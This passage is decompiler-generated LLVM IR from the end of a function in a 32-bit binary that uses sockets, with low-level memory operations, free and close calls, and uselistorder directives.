  %v2_8052e8d = inttoptr i32 %v1_8052e8d to i32*
  %v3_8052e8d = load i32, i32* %v2_8052e8d, align 4
  %v5_8052e8d = add i32 %v0_8052e8a, -16
  %v6_8052e8d = inttoptr i32 %v5_8052e8d to i32*
  store i32 %v3_8052e8d, i32* %v6_8052e8d, align 4
  %v1_8052e91 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8052e91, i32* %eax.global-to-local, align 4
  %v0_8052e96 = load i32, i32* @esp, align 4
  %v1_8052e99 = add i32 %v0_8052e96, 272
  %v2_8052e99 = inttoptr i32 %v1_8052e99 to i32*
  %v3_8052e99 = load i32, i32* %v2_8052e99, align 4
  %v4_8052e99 = icmp eq i32 %v3_8052e99, 0
  br i1 %v4_8052e99, label %dec_label_pc_8052eae, label %dec_label_pc_8052ea3

dec_label_pc_8052ea3:                             ; preds = %dec_label_pc_8052e8a
  store i32 %v3_8052e99, i32* %edx.global-to-local, align 4
  %v2_8052eaa = inttoptr i32 %v3_8052e99 to i32*
  store i32 %v2_805291a, i32* %v2_8052eaa, align 4
  %v0_8052eba.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052eba

dec_label_pc_8052eae:                             ; preds = %dec_label_pc_8052e8a
  %v3_8052eb1 = inttoptr i32 %v0_8052e96 to i32*
  store i32 %v2_805291a, i32* %v3_8052eb1, align 4
  %v1_8052eb2 = call i32 @free(i32 -1)
  store i32 %v1_8052eb2, i32* %eax.global-to-local, align 4
  %v0_8052eb7 = load i32, i32* @esp, align 4
  %v1_8052eb7 = add i32 %v0_8052eb7, 16
  br label %dec_label_pc_8052eba

dec_label_pc_8052eba:                             ; preds = %dec_label_pc_8052ea3, %dec_label_pc_8052eae
  %v0_8052eba = phi i32 [ %v0_8052eba.pre, %dec_label_pc_8052ea3 ], [ %v1_8052eb7, %dec_label_pc_8052eae ]
  %v1_8052ebd = add i32 %v0_8052eba, 12
  %v2_8052ebd = inttoptr i32 %v1_8052ebd to i32*
  %v3_8052ebd = load i32, i32* %v2_8052ebd, align 4
  %v5_8052ebd = add i32 %v0_8052eba, -16
  %v6_8052ebd = inttoptr i32 %v5_8052ebd to i32*
  store i32 %v3_8052ebd, i32* %v6_8052ebd, align 4
  %v1_8052ec1 = call i32 @free(i32 -1)
  store i32 %v1_8052ec1, i32* @eax, align 4
  %v0_8052ec6 = load i32, i32* @esp, align 4
  %v1_8052ec9 = add i32 %v0_8052ec6, 8
  %v2_8052ec9 = inttoptr i32 %v1_8052ec9 to i32*
  store i32 ptrtoint (i8** @global_var_805fd68.278 to i32), i32* %v2_8052ec9, align 4
  %v1_8052ece = add i32 %v0_8052ec6, 4
  %v2_8052ece = inttoptr i32 %v1_8052ece to i32*
  store i32 134550975, i32* %v2_8052ece, align 4
  %v1_8052ed3 = add i32 %v0_8052ec6, 200
  store i32 %v1_8052ed3, i32* %ebx.global-to-local, align 4
  %v3_8052eda = inttoptr i32 %v0_8052ec6 to i32*
  store i32 %v1_8052ed3, i32* %v3_8052eda, align 4
  %v2_8052edb = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052edb, i32* %eax.global-to-local, align 4
  %v0_8052ee0 = load i32, i32* @esp, align 4
  %v1_8052ee0 = inttoptr i32 %v0_8052ee0 to i32*
  store i32 ptrtoint (i8** @global_var_805fd68.278 to i32), i32* %v1_8052ee0, align 4
  %v1_8052ee7 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052ee7, i32* %eax.global-to-local, align 4
  %v0_8052eec = load i32, i32* @esp, align 4
  %v1_8052eec = add i32 %v0_8052eec, 56
  %v2_8052eec = inttoptr i32 %v1_8052eec to i32*
  %v3_8052eec = load i32, i32* %v2_8052eec, align 4
  store i32 %v3_8052eec, i32* @eax, align 4
  %v1_8052ef0 = add i32 %v0_8052eec, 72
  %v2_8052ef0 = inttoptr i32 %v1_8052ef0 to i32*
  %v3_8052ef0 = load i32, i32* %v2_8052ef0, align 4
  store i32 %v3_8052ef0, i32* %edx.global-to-local, align 4
  %v1_8052ef4 = inttoptr i32 %v0_8052eec to i32*
  %v3_8052ef4 = add i32 %v0_8052eec, 4
  %v1_8052ef5 = inttoptr i32 %v3_8052ef4 to i32*
  store i32 1, i32* %v1_8052ef5, align 4
  %v0_8052ef8 = load i32, i32* @eax, align 4
  %v1_8052ef8 = sext i32 %v0_8052ef8 to i64
  store i64 %v1_8052ef8, i64* @global_var_805fd80.279, align 128
  %v0_8052efd = load i32, i32* %edx.global-to-local, align 4
  %v1_8052efd = trunc i32 %v0_8052efd to i16
  store i16 %v1_8052efd, i16* @global_var_8059ac4.280, align 4
  %v0_8052f04 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052f04, i32* %v1_8052ef4, align 4
  %v2_8052f05 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052f05, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053046

dec_label_pc_8052f0f:                             ; preds = %dec_label_pc_8052e49
  %v1_8052f12 = inttoptr i32 %v0_8052e49 to i32*
  %v2_8052f12 = load i32, i32* %v1_8052f12, align 4
  %v5_8052f12 = inttoptr i32 %v0_8052e39 to i32*
  store i32 %v2_8052f12, i32* %v5_8052f12, align 4
  %v1_8052f14 = call i32 @free(i32 -1)
  store i32 %v1_8052f14, i32* @eax, align 4
  %v0_8052f19 = load i32, i32* @esp, align 4
  %v1_8052f19 = add i32 %v0_8052f19, 16
  br label %dec_label_pc_8052f1c

dec_label_pc_8052f1c:                             ; preds = %dec_label_pc_8052c4e, %dec_label_pc_8052d79, %dec_label_pc_8052d71, %dec_label_pc_8052d0d, %dec_label_pc_8052c93, %dec_label_pc_8052c6f, %dec_label_pc_8052f0f
  %v1_8052f23 = phi i32 [ %v1_8052c63, %dec_label_pc_8052c4e ], [ %v1_8052d6a, %dec_label_pc_8052d79 ], [ %v1_8052d6a, %dec_label_pc_8052d71 ], [ %v1_8052c84, %dec_label_pc_8052d0d ], [ %v1_8052c84, %dec_label_pc_8052c93 ], [ %v1_8052c84, %dec_label_pc_8052c6f ], [ %v1_8052f19, %dec_label_pc_8052f0f ]
  %v1_8052f1c = add i32 %v1_8052f23, 51
  %v2_8052f1c = inttoptr i32 %v1_8052f1c to i8*
  %v3_8052f1c = load i8, i8* %v2_8052f1c, align 1
  %v4_8052f1c = icmp eq i8 %v3_8052f1c, 0
  %v1_8052f21 = icmp eq i1 %v4_8052f1c, false
  br i1 %v1_8052f21, label %dec_label_pc_8052f67, label %dec_label_pc_8052f23

dec_label_pc_8052f23:                             ; preds = %dec_label_pc_8052f1c
  %v0_8052f23 = load i32, i32* @ecx, align 4
  %v2_8052f23 = add i32 %v1_8052f23, -4
  %v3_8052f23 = inttoptr i32 %v2_8052f23 to i32*
  store i32 %v0_8052f23, i32* %v3_8052f23, align 4
  %v1_8052f24 = add i32 %v1_8052f23, -8
  %v2_8052f24 = inttoptr i32 %v1_8052f24 to i32*
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %v2_8052f24, align 4
  %v1_8052f29 = add i32 %v1_8052f23, -12
  %v2_8052f29 = inttoptr i32 %v1_8052f29 to i32*
  store i32 134550975, i32* %v2_8052f29, align 4
  %v1_8052f2e = add i32 %v1_8052f23, 184
  store i32 %v1_8052f2e, i32* @esi, align 4
  %v2_8052f35 = add i32 %v1_8052f23, -16
  %v3_8052f35 = inttoptr i32 %v2_8052f35 to i32*
  store i32 %v1_8052f2e, i32* %v3_8052f35, align 4
  %v2_8052f36 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052f36, i32* %eax.global-to-local, align 4
  %v0_8052f3b = load i32, i32* @esp, align 4
  %v1_8052f3b = inttoptr i32 %v0_8052f3b to i32*
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %v1_8052f3b, align 4
  %v1_8052f42 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052f42, i32* %eax.global-to-local, align 4
  %v0_8052f47 = load i32, i32* @esp, align 4
  %v1_8052f47 = inttoptr i32 %v0_8052f47 to i32*
  %v2_8052f47 = load i32, i32* %v1_8052f47, align 4
  store i32 %v2_8052f47, i32* @eax, align 4
  %v3_8052f47 = add i32 %v0_8052f47, 4
  %v1_8052f48 = inttoptr i32 %v3_8052f47 to i32*
  %v2_8052f48 = load i32, i32* %v1_8052f48, align 4
  store i32 %v2_8052f48, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052f48, align 4
  %v0_8052f4b = load i32, i32* @esi, align 4
  store i32 %v0_8052f4b, i32* %v1_8052f47, align 4
  %v0_8052f4c = load i32, i32* @global_var_80601b8.281, align 8
  store i32 %v0_8052f4c, i32* %ebx.global-to-local, align 4
  %v2_8052f52 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052f52, i32* %eax.global-to-local, align 4
  %v0_8052f57 = load i32, i32* @esp, align 4
  %v1_8052f57 = add i32 %v0_8052f57, 16
  %v1_8052f5a = add i32 %v0_8052f4c, -1
  store i32 %v1_8052f5a, i32* @ebx, align 4
  %v1_8052f5b = add i32 %v0_8052f57, 52
  %v2_8052f5b = inttoptr i32 %v1_8052f5b to i32*
  %v3_8052f5b = load i32, i32* %v2_8052f5b, align 4
  %v5_8052f5b = sub i32 %v3_8052f5b, %v1_8052f5a
  %v11_8052f5b = xor i32 %v3_8052f5b, %v1_8052f5a
  %v12_8052f5b = xor i32 %v5_8052f5b, %v3_8052f5b
  %v13_8052f5b = and i32 %v12_8052f5b, %v11_8052f5b
  %v14_8052f5b = icmp slt i32 %v13_8052f5b, 0
  %v16_8052f5b = icmp slt i32 %v5_8052f5b, 0
  %v2_8052f5f = icmp eq i1 %v16_8052f5b, %v14_8052f5b
  br i1 %v2_8052f5f, label %dec_label_pc_8052f67, label %dec_label_pc_8052f61

dec_label_pc_8052f61:                             ; preds = %dec_label_pc_8052f23
  %v4_8052f61 = add i32 %v3_8052f5b, 1
  store i32 %v4_8052f61, i32* %v2_8052f5b, align 4
  br label %dec_label_pc_8052f88.backedge

dec_label_pc_8052f67:                             ; preds = %dec_label_pc_8052bf0, %dec_label_pc_8052f23, %dec_label_pc_8052f1c, %dec_label_pc_8052c07
  %v1_8052f74 = phi i32 [ %v1_8052f57, %dec_label_pc_8052f23 ], [ %v1_8052f23, %dec_label_pc_8052f1c ], [ %v1_8052c43, %dec_label_pc_8052c07 ], [ %v0_8052f67.pre, %dec_label_pc_8052bf0 ]
  %v1_8052f67 = add i32 %v1_8052f74, 40
  %v2_8052f67 = inttoptr i32 %v1_8052f67 to i32*
  %v3_8052f67 = load i32, i32* %v2_8052f67, align 4
  %v1_8052f6b = add i32 %v3_8052f67, 1
  store i32 %v1_8052f6b, i32* %eax.global-to-local, align 4
  %v1_8052f6c = ashr i32 %v1_8052f6b, 31
  store i32 %v1_8052f6c, i32* %edx.global-to-local, align 4
  %v1_8052f6d = add i32 %v1_8052f74, 248
  %v2_8052f6d = inttoptr i32 %v1_8052f6d to i32*
  %v3_8052f6d = load i32, i32* %v2_8052f6d, align 4
  %v5_8052f6d = zext i32 %v1_8052f6b to i64
  %v7_8052f6d = zext i32 %v1_8052f6c to i64
  %v8_8052f6d = mul nuw i64 %v7_8052f6d, 4294967296
  %v9_8052f6d = or i64 %v8_8052f6d, %v5_8052f6d
  %v10_8052f6d = zext i32 %v3_8052f6d to i64
  %v11_8052f6d = sdiv i64 %v9_8052f6d, %v10_8052f6d
  %v12_8052f6d = trunc i64 %v11_8052f6d to i32
  store i32 %v12_8052f6d, i32* %eax.global-to-local, align 4
  %v13_8052f6d = srem i64 %v9_8052f6d, %v10_8052f6d
  %v14_8052f6d = trunc i64 %v13_8052f6d to i32
  store i32 %v14_8052f6d, i32* %edx.global-to-local, align 4
  store i32 %v14_8052f6d, i32* %v2_8052f67, align 4
  %v1_8052f78 = icmp eq i32 %v14_8052f6d, 0
  %v1_8052f7a = icmp eq i1 %v1_8052f78, false
  br i1 %v1_8052f7a, label %dec_label_pc_8052f80, label %dec_label_pc_8052f7c

dec_label_pc_8052f7c:                             ; preds = %dec_label_pc_8052f67
  %v0_8052f7c = load i32, i32* @esp, align 4
  %v1_8052f7c = add i32 %v0_8052f7c, 28
  %v2_8052f7c = inttoptr i32 %v1_8052f7c to i32*
  %v3_8052f7c = load i32, i32* %v2_8052f7c, align 4
  %v4_8052f7c = add i32 %v3_8052f7c, 1
  store i32 %v4_8052f7c, i32* %v2_8052f7c, align 4
  br label %dec_label_pc_8052f80

dec_label_pc_8052f80:                             ; preds = %dec_label_pc_8052f67, %dec_label_pc_8052f7c
  %v0_8052f80 = load i32, i32* @esp, align 4
  %v1_8052f80 = add i32 %v0_8052f80, 36
  %v2_8052f80 = inttoptr i32 %v1_8052f80 to i32*
  store i32 -1, i32* %v2_8052f80, align 4
  br label %dec_label_pc_8052f88.backedge

dec_label_pc_8052f88.backedge:                    ; preds = %dec_label_pc_8052f80, %dec_label_pc_8052bfe, %dec_label_pc_8052cec, %dec_label_pc_8052f61
  %v0_8052f88.pre = load i32, i32* @esp, align 4
  %v1_8052f88 = add i32 %v0_8052f88.pre, 28
  %v2_8052f88 = inttoptr i32 %v1_8052f88 to i32*
  %v3_8052f88 = load i32, i32* %v2_8052f88, align 4
  %tmp120 = icmp ult i32 %v3_8052f88, 3
  br i1 %tmp120, label %dec_label_pc_80529e8, label %dec_label_pc_8052fad

dec_label_pc_8052fad:                             ; preds = %dec_label_pc_8052962, %dec_label_pc_80529fe, %dec_label_pc_8052af2, %dec_label_pc_8052f88.backedge, %entry, %dec_label_pc_805293c, %dec_label_pc_8052944, %dec_label_pc_8052952
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8052952 ], [ -1, %dec_label_pc_8052944 ], [ -1, %dec_label_pc_805293c ], [ -1, %entry ], [ %v0_80529af, %dec_label_pc_8052f88.backedge ], [ %v0_80529af, %dec_label_pc_8052af2 ], [ %v0_80529af, %dec_label_pc_80529fe ], [ %v0_80529af, %dec_label_pc_8052962 ]
  %v0_8052fad = call i32 @__GI___h_errno_location()
  store i32 %v0_8052fad, i32* %eax.global-to-local, align 4
  %v1_8052fb2 = inttoptr i32 %v0_8052fad to i32*
  store i32 -1, i32* %v1_8052fb2, align 4
  %v0_8052fb8 = load i32, i32* @esp, align 4
  %v1_8052fb8 = add i32 %v0_8052fb8, 44
  %v2_8052fb8 = inttoptr i32 %v1_8052fb8 to i32*
  %v3_8052fb8 = load i32, i32* %v2_8052fb8, align 4
  store i32 %v3_8052fb8, i32* %eax.global-to-local, align 4
  %v2_8052fbc = add i32 %v0_8052fb8, 56
  %v3_8052fbc = inttoptr i32 %v2_8052fbc to i32*
  store i32 %v3_8052fb8, i32* %v3_8052fbc, align 4
  br label %dec_label_pc_8052fc0

dec_label_pc_8052fc0:                             ; preds = %dec_label_pc_8052d25, %dec_label_pc_8052cfd, %dec_label_pc_8052fad
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8052fad ], [ %v0_80529af, %dec_label_pc_8052d25 ], [ %v0_80529af, %dec_label_pc_8052cfd ]
  %v0_8052fc0 = load i32, i32* @esp, align 4
  %v1_8052fc0 = add i32 %v0_8052fc0, 20
  %v2_8052fc0 = inttoptr i32 %v1_8052fc0 to i32*
  %v3_8052fc0 = load i32, i32* %v2_8052fc0, align 4
  %v13_8052fc0 = icmp eq i32 %v3_8052fc0, -1
  br i1 %v13_8052fc0, label %dec_label_pc_8052fc0.dec_label_pc_8052fd6_crit_edge, label %dec_label_pc_8052fc7

dec_label_pc_8052fc0.dec_label_pc_8052fd6_crit_edge: ; preds = %dec_label_pc_8052fc0
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8052fd6

dec_label_pc_8052fc7:                             ; preds = %dec_label_pc_8052fc0
  %v3_8052fca = load i32, i32* %v2_8052fc0, align 4
  %v5_8052fca = add i32 %v0_8052fc0, -16
  %v6_8052fca = inttoptr i32 %v5_8052fca to i32*
  store i32 %v3_8052fca, i32* %v6_8052fca, align 4
  %v1_8052fce = sext i16 %stack_var_-192.1 to i32
  %v2_8052fce = call i32 @__libc_close(i32 %v1_8052fce)
  store i32 %v2_8052fce, i32* %eax.global-to-local, align 4
  %v0_8052fd3 = load i32, i32* @esp, align 4
  %v1_8052fd3 = add i32 %v0_8052fd3, 16
  br label %dec_label_pc_8052fd6

dec_label_pc_8052fd6:                             ; preds = %dec_label_pc_8052fc0.dec_label_pc_8052fd6_crit_edge, %dec_label_pc_8052fc7
  %v1_8052fdd.pre-phi = phi i32 [ %.pre, %dec_label_pc_8052fc0.dec_label_pc_8052fd6_crit_edge ], [ %v1_8052fce, %dec_label_pc_8052fc7 ]
  %v0_8052fd6 = phi i32 [ %v0_8052fc0, %dec_label_pc_8052fc0.dec_label_pc_8052fd6_crit_edge ], [ %v1_8052fd3, %dec_label_pc_8052fc7 ]
  %v1_8052fd9 = add i32 %v0_8052fd6, 12
  %v2_8052fd9 = inttoptr i32 %v1_8052fd9 to i32*
  %v3_8052fd9 = load i32, i32* %v2_8052fd9, align 4
  %v5_8052fd9 = add i32 %v0_8052fd6, -16
  %v6_8052fd9 = inttoptr i32 %v5_8052fd9 to i32*
  store i32 %v3_8052fd9, i32* %v6_8052fd9, align 4
  %v2_8052fdd = call i32 @free(i32 %v1_8052fdd.pre-phi)
  store i32 %v2_8052fdd, i32* %eax.global-to-local, align 4
  %v1_8052fe2 = load i32, i32* @esp, align 4
  %v2_8052fe2 = inttoptr i32 %v1_8052fe2 to i32*
  store i32 %v2_805291a, i32* %v2_8052fe2, align 4
  %v2_8052fe5 = call i32 @free(i32 %v1_8052fdd.pre-phi)
  store i32 %v2_8052fe5, i32* @eax, align 4
  %v0_8052fea = load i32, i32* @esp, align 4
  %v1_8052fed = add i32 %v0_8052fea, 32
  %v2_8052fed = inttoptr i32 %v1_8052fed to i32*
  store i32 -1, i32* %v2_8052fed, align 4
  %v0_8052ff5 = load i32, i32* @esp, align 4
  %v1_8052ff5 = add i32 %v0_8052ff5, 40
  %v2_8052ff5 = inttoptr i32 %v1_8052ff5 to i32*
  %v3_8052ff5 = load i32, i32* %v2_8052ff5, align 4
  %v13_8052ff5 = icmp eq i32 %v3_8052ff5, -1
  br i1 %v13_8052ff5, label %dec_label_pc_8053049, label %dec_label_pc_8052ffc

dec_label_pc_8052ffc:                             ; preds = %dec_label_pc_8052fd6
  %v0_8052ffc = load i32, i32* @ecx, align 4
  %v2_8052ffc = add i32 %v0_8052ff5, -4
  %v3_8052ffc = inttoptr i32 %v2_8052ffc to i32*
  store i32 %v0_8052ffc, i32* %v3_8052ffc, align 4
  %v1_8052ffd = add i32 %v0_8052ff5, -8
  %v2_8052ffd = inttoptr i32 %v1_8052ffd to i32*
  store i32 ptrtoint (i8** @global_var_805fd68.278 to i32), i32* %v2_8052ffd, align 4
  %v1_8053002 = add i32 %v0_8052ff5, -12
  %v2_8053002 = inttoptr i32 %v1_8053002 to i32*
  store i32 134550975, i32* %v2_8053002, align 4
  %v1_8053007 = add i32 %v0_8052ff5, 184
  store i32 %v1_8053007, i32* %ebx.global-to-local, align 4
  %v2_805300e = add i32 %v0_8052ff5, -16
  %v3_805300e = inttoptr i32 %v2_805300e to i32*
  store i32 %v1_8053007, i32* %v3_805300e, align 4
  %v3_805300f = call i32 @__pthread_return_void(i32 %v1_8052fdd.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805300f, i32* %eax.global-to-local, align 4
  %v0_8053014 = load i32, i32* @esp, align 4
  %v1_8053014 = inttoptr i32 %v0_8053014 to i32*
  store i32 ptrtoint (i8** @global_var_805fd68.278 to i32), i32* %v1_8053014, align 4
  %v2_805301b = call i32 @__pthread_return_0(i32 %v1_8052fdd.pre-phi)
  store i32 %v2_805301b, i32* %eax.global-to-local, align 4
  %v0_8053020 = load i32, i32* @esp, align 4
  %v1_8053020 = add i32 %v0_8053020, 56
  %v2_8053020 = inttoptr i32 %v1_8053020 to i32*
  %v3_8053020 = load i32, i32* %v2_8053020, align 4
  store i32 %v3_8053020, i32* %edx.global-to-local, align 4
  %v1_8053024 = add i32 %v0_8053020, 72
  %v2_8053024 = inttoptr i32 %v1_8053024 to i32*
  %v3_8053024 = load i32, i32* %v2_8053024, align 4
  store i32 %v3_8053024, i32* %eax.global-to-local, align 4
  %v1_8053028 = sext i32 %v3_8053020 to i64
  store i64 %v1_8053028, i64* @global_var_805fd80.279, align 128
  %v1_805302e = trunc i32 %v3_8053024 to i16
  store i16 %v1_805302e, i16* @global_var_8059ac4.280, align 4
  %v1_8053034 = inttoptr i32 %v0_8053020 to i32*
  %v2_8053034 = load i32, i32* %v1_8053034, align 4
  store i32 %v2_8053034, i32* @eax, align 4
  %v3_8053034 = add i32 %v0_8053020, 4
  %v1_8053035 = inttoptr i32 %v3_8053034 to i32*
  %v2_8053035 = load i32, i32* %v1_8053035, align 4
  store i32 %v2_8053035, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8053035, align 4
  %v0_8053038 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053038, i32* %v1_8053034, align 4
  %v3_8053039 = call i32 @__pthread_return_void(i32 %v1_8052fdd.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053039, i32* %eax.global-to-local, align 4
  %v0_805303e = load i32, i32* @esp, align 4
  %v1_805303e = add i32 %v0_805303e, 32
  %v2_805303e = inttoptr i32 %v1_805303e to i32*
  store i32 -1, i32* %v2_805303e, align 4
  br label %dec_label_pc_8053046

dec_label_pc_8053046:                             ; preds = %dec_label_pc_8052eba, %dec_label_pc_8052ffc
  %v0_8053046 = load i32, i32* @esp, align 4
  %v1_8053046 = add i32 %v0_8053046, 16
  br label %dec_label_pc_8053049

dec_label_pc_8053049:                             ; preds = %dec_label_pc_8052fd6, %dec_label_pc_8053046
  %v0_8053049 = phi i32 [ %v0_8052ff5, %dec_label_pc_8052fd6 ], [ %v1_8053046, %dec_label_pc_8053046 ]
  %v1_8053049 = add i32 %v0_8053049, 16
  %v2_8053049 = inttoptr i32 %v1_8053049 to i32*
  %v3_8053049 = load i32, i32* %v2_8053049, align 4
  store i32 %v3_8053049, i32* %eax.global-to-local, align 4
  %v1_805304d = add i32 %v0_8053049, 220
  %v1_8053053 = inttoptr i32 %v1_805304d to i32*
  %v2_8053053 = load i32, i32* %v1_8053053, align 4
  store i32 %v2_8053053, i32* @ebx, align 4
  %v3_8053053 = add i32 %v0_8053049, 224
  %v1_8053054 = inttoptr i32 %v3_8053053 to i32*
  %v2_8053054 = load i32, i32* %v1_8053054, align 4
  store i32 %v2_8053054, i32* @esi, align 4
  %v3_8053054 = add i32 %v0_8053049, 228
  %v1_8053055 = inttoptr i32 %v3_8053054 to i32*
  %v2_8053055 = load i32, i32* %v1_8053055, align 4
  store i32 %v2_8053055, i32* @edi, align 4
  %v3_8053055 = add i32 %v0_8053049, 232
  %v1_8053056 = inttoptr i32 %v3_8053055 to i32*
  %v2_8053056 = load i32, i32* %v1_8053056, align 4
  store i32 %v2_8053056, i32* @ebp, align 4
  ret i32 %v3_8053049

; uselistorder directives
  uselistorder i32 %v0_8053049, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8053020, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052ff5, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8052fd6, { 1, 0 }
  uselistorder i32 %v1_8052fdd.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8052f88.pre, { 1, 0 }
  uselistorder i32 %v5_8052f5b, { 1, 0 }
  uselistorder i32 %v3_8052f5b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8052f23, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8052eec, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052eba, { 1, 0 }
  uselistorder i32 %v3_8052e99, { 1, 0, 2 }
  uselistorder i32 %v0_8052e8a, { 1, 0 }
  uselistorder i32 %v5_8052e80, { 1, 0 }
  uselistorder i32* %v3_8052e80, { 1, 0 }
  uselistorder i32 %v0_8052d5681, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8052e80, { 2, 1, 0 }
  uselistorder i32 %v5_8052e7a, { 1, 0 }
  uselistorder i32 %v1_8052e79, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052e75, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052e39, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8052e13, { 1, 0 }
  uselistorder i32 %v1_8052e04, { 1, 0 }
  uselistorder i32 %v0_8052dc3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8052d6a, { 1, 2, 0 }
  uselistorder i32 %v0_8052d6a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8052d44, { 1, 0 }
  uselistorder i32 %v1_8052d3e, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052d39, { 1, 2, 0 }
  uselistorder i32 %v5_8052d4458, { 1, 0 }
  uselistorder i32 %v5_8052ce6, { 1, 0 }
  uselistorder i32 %v3_8052ce6, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8052c9e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052c84, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8052c84, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8052c63, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052c43, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052be9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8052bce, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8052bb7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052b3f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052b2c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8052af2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052ad3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052ab7, { 1, 0 }
  uselistorder i32 %v3_8052aac, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8052aa9, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8052a4e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052a49, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052a32, { 1, 0 }
  uselistorder i32 %v1_80529fe, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80529ef92, { 2, 1, 0 }
  uselistorder i32 %v3_8052a07, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_80529af, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_80529a8, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805291a, { 1, 9, 2, 10, 6, 3, 5, 11, 0, 4, 7, 8, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 16, 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %ebx.global-to-local, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 80, 81, 82, 83, 84, 0, 1, 2, 73, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61, 57, 58, 59, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 76, 77, 78, 79 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 3, 1, 2 }
  uselistorder i32 68, { 5, 0, 2, 3, 4, 1 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 17, { 13, 11, 9, 10, 4, 5, 3, 0, 14, 8, 2, 1, 12, 6, 7 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 53, 54, 51, 52, 55, 56 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
